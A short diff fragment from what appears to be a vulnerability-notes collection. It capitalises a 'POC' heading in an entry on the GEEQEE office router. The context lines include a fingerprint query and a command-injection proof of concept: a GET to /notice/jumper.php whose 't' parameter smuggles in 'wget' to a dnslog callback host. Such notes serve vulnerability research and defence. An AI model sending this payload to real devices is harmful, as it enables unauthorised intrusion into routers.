@@ -8,7 +8,7 @@
 app="GEEQEE-极企智能办公路由"
 ```
 
-## poc
+## POC
 
 ```
 GET /notice/jumper.php?t=;wget%20http://xxx.dnslog.cn HTTP/1.1
